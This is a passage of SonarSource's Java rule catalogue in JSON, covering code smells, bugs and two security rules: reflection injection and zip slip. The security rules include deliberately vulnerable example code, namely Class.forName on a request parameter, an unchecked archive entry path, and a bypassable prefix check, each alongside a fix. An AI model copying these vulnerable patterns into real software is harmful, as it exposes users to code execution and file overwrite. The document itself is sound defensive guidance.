structure","tags":["java16"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>In Switch Expressions, an arrow label consisting of a block with a single <code>yield</code> can be simplified to directly return the value,\nresulting in cleaner code.</p>\n<p>Similarly, for Switch Statements and arrow labels, a <code>break</code> in a block is always redundant and should not be used. Furthermore, if the\nresulting block contains only one statement, the curly braces of that block can also be omitted.</p>\n<p>This rule reports an issue when a case of a Switch Expression contains a block with a single <code>yield</code> or when a Switch Statement contains\na block with a <code>break</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nint i = switch (mode) {\n  case \"a\" -&gt; {        // Noncompliant: Remove the redundant block and yield.\n    yield 1;\n  }\n  default -&gt; {         // Noncompliant: Remove the redundant block and yield.\n    yield 2;\n  }\n};\n\nswitch (mode) {\n  case \"a\" -&gt; {        // Noncompliant: Remove the redundant block and break.\n    result = 1;\n    break;\n  }\n  default -&gt; {         // Noncompliant: Remove the redundant break.\n    doSomethingElse();\n    result = 2;\n    break;\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nint i = switch (mode) {\n  case \"a\" -&gt; 1;\n  default -&gt; 2;\n};\n\nswitch (mode) {\n  case \"a\" -&gt; result = 1;\n  default -&gt; {\n   doSomethingElse();\n   result = 2;\n }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://openjdk.java.net/jeps/361\">JEP 361: Switch Expressions</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6205","summary":"Switch arrow labels should not use redundant keywords","tags":["java14"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>In Java 8 <code>Streams</code> were introduced to support chaining of operations over collections in a functional style. The most common way to\nsave a result of such chains is to save them to some collection (usually <code>List</code>). To do so there is a terminal method <code>collect</code>\nthat can be used with a library of <code>Collectors</code>. The key problem is that <code>.collect(Collectors.toList())</code> actually returns a\nmutable kind of <code>List</code> while in the majority of cases unmodifiable lists are preferred. In Java 10 a new collector appeared to return an\nunmodifiable list: <code>toUnmodifiableList()</code>. This does the trick but results in verbose code. Since Java 16 there is now a better variant to\nproduce an unmodifiable list directly from a stream: <code>Stream.toList()</code>.</p>\n<p>This rule raises an issue when \"collect\" is used to create a list from a stream.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nList&lt;String&gt; list1 = Stream.of(\"A\", \"B\", \"C\")\n                           .collect(Collectors.toList()); // Noncompliant\n\nList&lt;String&gt; list2 = Stream.of(\"A\", \"B\", \"C\")\n                           .collect(Collectors.toUnmodifiableList()); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nList&lt;String&gt; list1 = Stream.of(\"A\", \"B\", \"C\").toList(); // Compliant\n\nList&lt;String&gt; list2 = Stream.of(\"A\", \"B\", \"C\")\n                           .collect(Collectors.toList()); // Compliant, the list2 needs to be mutable\n\nlist2.add(\"X\");\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6204","summary":"\"Stream.toList()\" method should be used instead of \"collectors\" when unmodifiable list needed","tags":["java16"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>In Java 15 Text Blocks are official and can be used just like an ordinary String. However, when they are used to represent a big chunk of text,\nthey should not be used directly in complex expressions, as it decreases the readability. In this case, it is better to extract the text block into a\nvariable or a field.</p>\n<p>This rule reports an issue when a text block longer than a number of lines given as a parameter is directly used within a lambda expression.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nlistOfString.stream()\n  .map(str -&gt; !\"\"\"\n    &lt;project&gt;\n      &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\n      &lt;parent&gt;\n        &lt;groupId&gt;com.mycompany.app&lt;/groupId&gt;\n        &lt;artifactId&gt;my-app&lt;/artifactId&gt;\n        &lt;version&gt;1&lt;/version&gt;\n      &lt;/parent&gt;\n\n      &lt;groupId&gt;com.mycompany.app&lt;/groupId&gt;\n      &lt;artifactId&gt;my-module&lt;/artifactId&gt;\n      &lt;version&gt;1&lt;/version&gt;\n    &lt;/project&gt;\n    \"\"\".equals(str));\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nString myTextBlock = \"\"\"\n    &lt;project&gt;\n      &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\n      &lt;parent&gt;\n        &lt;groupId&gt;com.mycompany.app&lt;/groupId&gt;\n        &lt;artifactId&gt;my-app&lt;/artifactId&gt;\n        &lt;version&gt;1&lt;/version&gt;\n      &lt;/parent&gt;\n\n      &lt;groupId&gt;com.mycompany.app&lt;/groupId&gt;\n      &lt;artifactId&gt;my-module&lt;/artifactId&gt;\n      &lt;version&gt;1&lt;/version&gt;\n    &lt;/project&gt;\n    \"\"\";\n\nlistOfString.stream()\n  .map(str -&gt; !myTextBlock.equals(str));\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://openjdk.java.net/jeps/378\">JEP 378: Text Blocks</a> </li>\n  <li> <a href=\"https://openjdk.org/projects/amber/guides/text-blocks-guide\">Programmerâs Guide To Text Blocks</a>, by Jim Laskey and Stuart Marks\n  </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6203","summary":"Text blocks should not be used in complex expressions","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The <code>instanceof</code> construction is a preferred way to check whether a variable can be cast to some type statically because a compile-time\nerror will occur in case of incompatible types. The method <a\nhref=\"https://docs.oracle.com/javase/8/docs/api/java/lang/Class.html#isInstance-java.lang.Object-\">isInstance()</a> from <code>java.lang.Class</code>\nworks differently and does type check at runtime only, incompatible types will therefore not be detected early in the development, potentially\nresulting in dead code. The <code>isInstance()</code> method should only be used in dynamic cases when the <code>instanceof</code> operator canât be\nused.</p>\n<p>This rule raises an issue when <code>isInstance()</code> is used and could be replaced with an <code>instanceof</code> check.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nint f(Object o) {\n&nbsp; if (String.class.isInstance(o)) {&nbsp; // Noncompliant\n&nbsp; &nbsp; return 42;\n&nbsp; }\n&nbsp; return 0;\n}\n\nint f(Number n) {\n&nbsp; if (String.class.isInstance(n)) {&nbsp; // Noncompliant\n&nbsp; &nbsp; return 42;\n&nbsp; }\n&nbsp; return 0;\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nint f(Object o) {\n&nbsp; if (o instanceof String) {&nbsp; // Compliant\n&nbsp; &nbsp; return 42;\n&nbsp; }\n&nbsp; return 0;\n}\n\nint f(Number n) {\n&nbsp; if (n instanceof String) {&nbsp; // Compile-time error\n&nbsp; &nbsp; return 42;\n&nbsp; }\n&nbsp; return 0;\n}\n\nboolean fun(Object o, String c) throws ClassNotFoundException\n{\n  return Class.forName(c).isInstance(o); // Compliant, can't use instanceof operator here\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6202","summary":"Operator \"instanceof\" should be used instead of \"A.class.isInstance()\"","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>In Java 16, the feature \"Pattern matching for instanceof\" is finalized and can&nbsp;be used in production. Previously developers needed to do 3\noperations in order to do this: check the variable type, cast it and assign the casted value to the new variable. This approach is quite verbose and\ncan be replaced with pattern matching for&nbsp;<code>instanceof</code>, doing these 3 actions (check, cast and assign) in one expression.</p>\n<p>This rule raises an issue when an <code>instanceof</code> check followed by a cast and an assignment could be replaced by pattern matching.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nint f(Object o) {\n  if (o instanceof String) {&nbsp; // Noncompliant\n    String string = (String) o;\n    return string.length();\n  }\n  return 0;\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nint f(Object o) {\n&nbsp; if (o instanceof String string) {&nbsp; // Compliant\n&nbsp; &nbsp; return string.length();\n&nbsp; }\n&nbsp; return 0;\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://openjdk.java.net/jeps/394\">JEP 394: Pattern Matching for instanceof</a> &nbsp; </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6201","summary":"Pattern Matching for \"instanceof\" operator should be used instead of simple \"instanceof\" + cast","tags":["java16"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Reflection injections occur in a web application when it retrieves data from a user or a third-party service and fully or partially uses it to\ninspect, load or invoke a component by name.</p>\n<p>If an application uses a reflection method in a way that is vulnerable to injections, it is exposed to attacks that aim to achieve remote code\nexecution on the serverâs website.</p>\n<p>A user with malicious intent exploits this by carefully crafting a string involving symbols such as class methods, that will help them change the\ninitial reflection logic to an impactful malicious one.</p>\n<p>After creating the malicious request and triggering it, the attacker can attack the servers affected by this vulnerability without relying on any\npre-requisites.</p>\n<h3>What is the potential impact?</h3>\n<p>If user-supplied values are used to choose which code is executed, an attacker may be able to supply carefully-chosen values that cause unexpected\ncode to run. The attacker can use this ability to run arbitrary code on the server.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Application-specific attacks</h4>\n<p>In this scenario, the attackers succeed in injecting a seemingly-legitimate object, but whose properties might be used maliciously.</p>\n<p>Depending on the application, attackers might be able to modify important data structures or content to escalate privileges or perform unwanted\nactions. For example, with an e-commerce application, this could be changing the number of products or prices.</p>\n<h4>Full application compromise</h4>\n<p>In the worst-case scenario, the attackers succeed in injecting an object triggering code execution.</p>\n<p>Depending on the attacker, code execution can be used with different intentions:</p>\n<ul>\n  <li> Download the internal serverâs data, most likely to sell it. </li>\n  <li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li>\n  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to\nelevate their privileges as an administrator and attack other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nthrough a combination of unsafe deserialization and misconfiguration:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Java Lang Package</h2>\n<h3>Code examples</h3>\n<p>In the following example, the code simulates a feature in an image editing application that allows users to install plugins to add new filters or\neffects. It assumes the user will give a known name, such as \"SepiaEffect\".</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport java.lang.Class;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\n\n@RestController\npublic class EffectController\n{\n    @GetMapping(value = \"/filter/apply\")\n    @ResponseBody\n    public ResponseEntity&lt;String&gt; apply(@RequestParam(\"effect\") String effectName)\n    {\n        try\n        {\n            Class effectClass                = Class.forName(effectName);  // Noncompliant\n            Constructor&lt;?&gt; effectConstructor = effectClass.getConstructor();\n            Object EffectObject              = effectConstructor.newInstance();\n            Method applyMethod               = effectClass.getMethod(\"applyFilter\");\n\n            boolean result = (boolean) applyMethod.invoke(EffectObject);\n\n            if (result) {\n                return new ResponseEntity&lt;&gt;(\"Filter Applied\", HttpStatus.OK);\n            }\n\n        } catch (Exception e) {}\n\n        return new ResponseEntity&lt;&gt;(\"Filter Failure\", HttpStatus.FORBIDDEN);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.lang.Class;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\n\n@RestController\npublic class EffectController\n{\n    private static Set&lt;String&gt; EFFECT_ALLOW_LIST = new HashSet&lt;&gt;();\n\n    static\n    {\n        allowList.add(\"SepiaEffect\");\n        allowList.add(\"BlackAndWhiteEffect\");\n        allowList.add(\"WaterColorEffect\");\n        allowList.add(\"OilPaintingEffect\");\n    }\n\n    @GetMapping(value = \"/filter/apply\")\n    @ResponseBody\n    public ResponseEntity&lt;String&gt; apply(@RequestParam(\"effect\") String effectName)\n    {\n        if (!EFFECT_ALLOW_LIST.contains(effectName)) {\n            return new ResponseEntity&lt;&gt;(\"Filter Failure\", HttpStatus.FORBIDDEN);\n        }\n\n        try\n        {\n            Class effectClass                = Class.forName(effectName);\n            Constructor&lt;?&gt; effectConstructor = effectClass.getConstructor();\n            Object EffectObject              = effectConstructor.newInstance();\n            Method applyMethod               = effectClass.getMethod(\"applyFilter\");\n\n            boolean result = (boolean) applyMethod.invoke(EffectObject);\n\n            if (result) {\n                return new ResponseEntity&lt;&gt;(\"Filter Applied\", HttpStatus.OK);\n            }\n\n        } catch (Exception e) {}\n\n        return new ResponseEntity&lt;&gt;(\"Filter Failure\", HttpStatus.FORBIDDEN);\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Pre-Approved commands</h4>\n<p>The cleanest way to avoid this defect is to validate the input before using it in a reflection method.</p>\n<p>Create a list of authorized and secure classes that you want the application to be able to execute.<br> If a user input does not match an entry in\nthis list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/470\">CWE-470 - Use of Externally-Controlled Input to Select Classes or Code ('Unsafe\n  Reflection')</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6173","summary":"Reflection should not be vulnerable to injection attacks","tags":["cwe","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.4.0.54424","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>In Java 15 Text Blocks are now official and can be used. The most common pattern for multiline strings in Java &lt; 15 was to write String\nconcatenation. Now itâs possible to do it in a more natural way using Text Blocks.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nString textBlock =\n               \"&lt;html&gt;\\n\" +\n               \"    &lt;body&gt;\\n\" +\n               \"        &lt;tag&gt;\\n\" +\n               \"        &lt;/tag&gt;\\n\" +\n               \"    &lt;/body&gt;\\n\" +\n               \"&lt;/html&gt;\";\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nString textBlock = \"\"\"\n        &lt;html&gt;\n            &lt;body&gt;\n                &lt;tag&gt;\n                &lt;/tag&gt;\n            &lt;/body&gt;\n        &lt;/html&gt;\"\"\";\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://openjdk.java.net/jeps/378\">JEP 378: Text Blocks</a> </li>\n  <li> <a href=\"https://openjdk.org/projects/amber/guides/text-blocks-guide\">Programmerâs Guide To Text Blocks</a>, by Jim Laskey and Stuart Marks\n  </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6126","summary":"String multiline concatenation should be replaced with Text Blocks","tags":["java15"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Map <a\nhref=\"https://docs.oracle.com/javase/8/docs/api/java/util/Map.html#computeIfAbsent-K-java.util.function.Function-\">computeIfAbsent</a>&nbsp;and <a\nhref=\"https://docs.oracle.com/javase/8/docs/api/java/util/Map.html#computeIfPresent-K-java.util.function.BiFunction-\">computeIfPresent</a> methods are\nconvenient to avoid the cumbersome process to check if a key exists or not, followed by the addition of the entry. However, when the function used to\ncompute the value returns <code>null</code>, the entry <code>key-&gt;null</code> will not be added to the Map. Furthermore, in the case of\n<code>computeIfPresent</code>, if the key is present the entry will be removed. These methods should therefore not be used to conditionally add an\nentry with a null value. The traditional way should be used instead.</p>\n<p>This rule raises an issue when <code>computeIfAbsent</code> or <code>computeIfPresent</code> is used with a lambda always returning null.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nmap.computeIfAbsent(key, k -&gt; null); // Noncompliant, the map will not contain an entry key-&gt;null.\nmap.computeIfPresent(key, (k, oldValue) -&gt; null); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nif (!map.containsKey(key)) {\n    map.put(key, null);\n}\nif (map.containsKey(key)) {\n    map.put(key, null);\n}\n</pre>\n<h2>Resources</h2>\n<h3>Related rules</h3>\n<ul>\n  <li> {rule:java:S3824} - \"Map.get\" and value test should be replaced with a single method call </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6104","summary":"Map \"computeIfAbsent()\" and \"computeIfPresent()\" should not be used to add \"null\" values.","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>AssertJ assertions taking <code>Consumer</code> objects as arguments are expected to contain \"requirements\", which should themselves be expressed\nas assertions. This concerns the following methods: <a\nhref=\"http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractIterableAssert.html#allSatisfy-java.util.function.Consumer-\">allSatisfy</a>,\n<a\nhref=\"http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractIterableAssert.html#anySatisfy-java.util.function.Consumer-\">anySatisfy</a>,\n<a\nhref=\"http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractIterableAssert.html#hasOnlyOneElementSatisfying-java.util.function.Consumer-\">hasOnlyOneElementSatisfying</a>,&nbsp;<a\nhref=\"https://tinyurl.com/yxnzt6pj\">isInstanceOfSatisfying</a>,&nbsp;<a\nhref=\"http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractIterableAssert.html#noneSatisfy-java.util.function.Consumer-\">noneSatisfy</a>,\n<a\nhref=\"http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractAssert.html#satisfies-java.util.function.Consumer-\">satisfies</a>,\n<a\nhref=\"http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractAssert.html#satisfiesAnyOf-java.util.function.Consumer-java.util.function.Consumer-\">satisfiesAnyOf</a>,&nbsp;<a\nhref=\"http://joel-costigliola.github.io/assertj/core-8/api/org/assertj/core/api/AbstractIterableAssert.html#zipSatisfy-java.lang.Iterable-java.util.function.BiConsumer-\">zipSatisfy</a>.</p>\n<p>These methods are assuming the&nbsp;<code>Consumer</code>&nbsp;will do the assertions itself. If you do not do any assertion in the\n<code>Consumer</code>, it probably means that you are inadvertently only partially testing your object.</p>\n<p>This rule raises an issue when a <code>Consumer</code> argument of any of the above methods does not contain any assertion.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nassertThat(myObject).isInstanceOfSatisfying(String.class, s -&gt; \"Hello\".equals(s)); // Noncompliant - not testing the string value\nassertThat(myObject).satisfies(\"Hello\"::equals); // Noncompliant - not testing the string value\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nassertThat(myObject).isInstanceOfSatisfying(String.class, s -&gt; assertThat(s).isEqualTo(\"Hello\"));\nassertThat(myObject).satisfies(obj -&gt; assertThat(obj).isEqualTo(\"Hello\"));\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6103","summary":"AssertJ assertions with \"Consumer\" arguments should contain assertion inside consumers","tags":["tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Zip slip is a special case of path injection. It occurs when an application uses the name of an archive entry to construct a file path and access\nthis file without validating its path first.</p>\n<p>This rule will consider all archives untrusted, assuming they have been created outside the application file system.</p>\n<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, in the archive entry name to change the initial\nintended path. The resulting path would resolve somewhere in the filesystem where the user should not normally have access.</p>\n<h3>What is the potential impact?</h3>\n<p>A web application is vulnerable to Zip Slip and an attacker is able to exploit it by submitting an archive he controls.</p>\n<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with\nroot privileges on Linux, and therefore any file can be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Override arbitrary files</h4>\n<p>The application opens the archive to copy its entries to the file system. The entries' names contain path traversal payloads for existing files in\nthe system, which are overwritten once the entries are copied. The vulnerability is exploited to corrupt files critical for the application or\noperating system to work properly.</p>\n<p>It could result in data being lost or the application being unavailable.</p>\n<h2>How to fix it in Java I/O API</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to Zip Slip as it is constructing a path using an archive entry name. This path is then used to copy a file\nwithout being validated first. Therefore, it can be leveraged by an attacker to overwrite arbitrary files.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Example {\n\n    static private String targetDirectory = \"/example/directory/\";\n\n    public void ExtractEntry(ZipFile zipFile) throws IOException {\n\n        Enumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries();\n        ZipEntry entry = entries.nextElement();\n        InputStream inputStream = zipFile.getInputStream(entry);\n\n        File file = new File(targetDirectory + entry.getName());\n\n        Files.copy(inputStream, file.toPath(), StandardCopyOption.REPLACE_EXISTING);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Example {\n\n    static private String targetDirectory = \"/example/directory/\";\n\n    public void ExtractEntry(ZipFile zipFile) throws IOException {\n\n        Enumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries();\n        ZipEntry entry = entries.nextElement();\n        InputStream inputStream = zipFile.getInputStream(entry);\n\n        File file = new File(targetDirectory + entry.getName());\n\n        String canonicalDestinationPath = file.getCanonicalPath();\n\n        if (canonicalDestinationPath.startsWith(targetDirectory)) {\n            Files.copy(inputStream, file.toPath(), StandardCopyOption.REPLACE_EXISTING, LinkOption.NOFOLLOW_LINKS);\n        }\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>The universal way to prevent Zip Slip is to validate the paths constructed from untrusted archive entry names.</p>\n<p>The validation should be done as follow:</p>\n<ol>\n  <li> Resolve the canonical path of the file by using methods like <code>java.io.File.getCanonicalFile</code> or\n  <code>java.io.File.getCanonicalPath</code>. This will resolve relative path or path components like <code>../</code> and removes any ambiguity\n  regarding the fileâs location. </li>\n  <li> Check that the canonical path is within the directory where the file should be located. </li>\n  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <strong>/base/dirmalicious</strong>\n  starts with <strong>/base/dir</strong> but does not start with <strong>/base/dir/</strong>. </li>\n</ol>\n<h3>Pitfalls</h3>\n<h4>Partial Path Traversal</h4>\n<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation strings all contain a path\nseparator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a\npath separator as the last character of the validation strings.</p>\n<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>targetDirectory</code> does not end with a path\nseparator:</p>\n<pre>\nstatic private String targetDirectory = \"/Users/John\";\n\npublic void ExtractEntry(ZipFile zipFile) throws IOException {\n\n    Enumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries();\n    ZipEntry entry = entries.nextElement();\n    InputStream inputStream = zipFile.getInputStream(entry);\n\n    File file = new File(entry.getName());\n\n    String canonicalDestinationPath = file.getCanonicalPath();\n\n    if (canonicalDestinationPath.startsWith(targetDirectory)) {\n        Files.copy(inputStream, file.toPath(), StandardCopyOption.REPLACE_EXISTING, LinkOption.NOFOLLOW_LINKS);\n    }\n}\n</pre>\n<p>This check can be bypassed because <code>\"/Users/Johnny\".startsWith(\"/Users/John\")</code> returns <code>true</code>. Thus, for validation,\n<code>\"/Users/John\"</code> should actually be <code>\"/Users/John/\"</code>.</p>\n<p><strong>Warning</strong>: Some functions, such as <code>.getCanonicalPath</code>, remove the terminating path separator in their return value.<br>\nThe validation code should be tested to ensure that it cannot be impacted by this issue.</p>\n<p><a href=\"https://github.com/aws/aws-sdk-java/security/advisories/GHSA-c28r-hw5m-5gv3\">Here is a real-life example of this vulnerability.</a></p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Sonar Blog - <a href=\"https://www.sonarsource.com/blog/the-hidden-flaws-of-archives-in-java/\">The Hidden Flaws of Archives in Java</a> </li>\n  <li> Sonar Blog - <a href=\"https://www.sonarsource.com/blog/openrefine-zip-slip/\">Unzipping Dangers: OpenRefine Zip Slip Vulnerability</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m4-insufficient-input-output-validation\">Mobile Top 10 2024 Category M4\n  - Insufficient Input/Output Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/22\">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path\n  Traversal')</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6096","summary":"Extracting archives should not lead to zip slip vulnerabilities","tags":["cwe","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Mockito provides <em>argument matchers</em> and <em>argument captors</em> for flexibly stubbing or verifying method calls.</p>\n<p><code>Mockito.verify()</code>, <code>Mockito.when()</code>, <code>Stubber.when()</code> and <code>BDDMockito.given()</code> each have overloads\nwith and without argument matchers.</p>\n<p>However, if argument matchers or captors are used only on some of the parameters, all the parameters need to have matchers as well, otherwise an\n<code>InvalidUseOfMatchersException</code> will be thrown.</p>\n<p>This rule consequently raises an issue every time matchers are not used on all the parameters of a stubbed/verified method.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Test\npublic void myTest() {\n    // Setting up mock responses\n    given(foo.bar(anyInt(), i1, 